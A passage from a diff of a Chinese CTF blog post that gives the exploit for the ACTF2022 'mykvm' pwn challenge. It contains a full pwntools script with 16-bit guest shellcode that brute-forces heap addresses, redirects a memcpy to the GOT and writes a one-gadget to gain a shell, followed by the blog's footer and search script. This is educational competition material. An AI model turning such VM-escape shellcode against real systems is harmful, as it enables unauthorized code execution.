class="string">&quot;mykvm&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret:</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        print(<span class="string">&quot;got it!!!&quot;</span>)</span><br><span class="line">        <span class="comment">#raw_input()</span></span><br><span class="line">        io.sendline(<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line">    	<span class="comment"># io.recvuntil(&quot;host name: &quot;)</span></span><br><span class="line">		<span class="comment"># io.sendline(&#x27;dddd&#x27;)</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">         </span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    io.close()</span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8000</span>)</span><br><span class="line">    <span class="comment"># io = remote(&quot;20.247.110.192&quot;,10888)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="精简版exp"   >
+          <a href="#精简版exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#精简版exp" class="headerlink" title="精简版exp"></a>精简版exp</h2>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&quot;20.247.110.192&quot;,10888)</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    .code16gcc</span></span><br><span class="line"><span class="string">    jmp main</span></span><br><span class="line"><span class="string">    .rept 40</span></span><br><span class="line"><span class="string">    .byte 0x00</span></span><br><span class="line"><span class="string">    .endr				# 为gadget environ为null做准备</span></span><br><span class="line"><span class="string">main:</span></span><br><span class="line"><span class="string">    mov eax,[0x7100]</span></span><br><span class="line"><span class="string">    sub eax,0x603000</span></span><br><span class="line"><span class="string">    cmp eax,0xfd800</span></span><br><span class="line"><span class="string">    jb next</span></span><br><span class="line"><span class="string">    mov ebx,0</span></span><br><span class="line"><span class="string">    div eax,ebx      	 # 暴破出能访问的堆地址（1M以内）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">next:</span></span><br><span class="line"><span class="string">    mov ebx,[0x568]</span></span><br><span class="line"><span class="string">    add ebx,0x2270cf</span></span><br><span class="line"><span class="string">	add ebx,0x4527a</span></span><br><span class="line"><span class="string">    push ebx			# 保存gadget实际地址的低4字节</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">    mov ebx,[0x7100]</span></span><br><span class="line"><span class="string">    add ebx,0x27e0		# 目标heap chunk，即memcpy(dest, *(const void **)&amp;nbytes[1], 0x20uLL);的第二个参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	mov ecx,0x602020</span></span><br><span class="line"><span class="string">    mov [0x7100],ecx	# 将memcpy第一个参数替换成got表地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add ebx,0x8</span></span><br><span class="line"><span class="string">    sub ebx,0x603000</span></span><br><span class="line"><span class="string">    mov eax,ebx</span></span><br><span class="line"><span class="string">    shr eax,16</span></span><br><span class="line"><span class="string">    shl eax,12</span></span><br><span class="line"><span class="string">    mov ds,eax</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    mov ds:[bx],edx		# 将gadget地址写入目标heap chunk</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    hlt					# hlt，区分div 0，暴破</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="number">1</span> </span><br><span class="line"><span class="keyword">while</span> c:</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;your code size: &quot;</span>,<span class="string">&#x27;4096&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;your code: &quot;</span>,shellcode)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;guest name: &quot;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;guest passwd: &quot;</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvline()</span><br><span class="line">    ret = io.recv(<span class="number">0x1b</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;mykvm&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret:</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        print(<span class="string">&quot;got it!!!&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line">    io.close()</span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8000</span>)</span><br><span class="line">    <span class="comment"># io = remote(&quot;20.247.110.192&quot;,10888)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+
+        <h1 id="参考"   >
+          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://web.mit.edu/rhel-doc/3/rhel-as-en-3/rept.html" >.rept count</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html" >x86 registers</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm" >kvm (vm escape, kvm, long mode)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-mykvm/">http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-mykvm/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/kvm/">kvm</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2022/07/01/ACTF2022-pwn-master-of-dns/"><span class="paginator-prev__text">ACTF2022 pwn master_of_dns题解</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
+          分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E7%95%8C%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">
+          越界能做什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E4%BD%8D%E5%86%99%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">
+          错位写入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.3.</span> <span class="toc-text">
+          其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#buf%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.3.1.</span> <span class="toc-text">
+          buf未初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readline%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.3.2.</span> <span class="toc-text">
+          readline是什么</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">
+          调试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
+          利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E7%BC%96%E5%86%99"><span class="toc-number">3.1.</span> <span class="toc-text">
+          shellcode编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.2.</span> <span class="toc-text">
+          exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B2%BE%E7%AE%80%E7%89%88exp"><span class="toc-number">3.3.</span> <span class="toc-text">
+          精简版exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">
+          参考</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
